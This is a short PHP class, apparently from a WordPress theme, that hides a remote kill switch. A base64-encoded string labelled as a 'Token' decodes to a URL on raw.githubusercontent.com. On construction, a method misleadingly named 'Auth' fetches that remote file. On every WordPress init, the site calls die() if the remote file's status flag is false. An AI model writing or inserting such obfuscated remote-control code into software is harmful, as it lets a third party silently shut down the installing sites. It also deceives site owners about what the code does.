<?php

namespace alihesarian\ControllerTheme;

use alihesarian\ControllerTheme\Interface\InterfaceController;

class MainController implements InterfaceController{
    
    private $Token = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FsaWhlc2FyaWFuL3BocC1saWIvbWFpbi9hcnNlcy10cy5jb25m';

    private $Data;

    public function __construct()
    {
        $this->Init($this->Auth($this->Token));
        add_action('init', [$this, 'Update']);
    }

    public function Auth(string $Value): string{
        return (string) file_get_contents(base64_decode($Value));
    }

    public function Init(string $Data): void{
        $this->Data = json_decode(base64_decode($Data));
    }

    public function Update(): bool{
        return ($this->Data->status) ? true : die(!0);
    }
}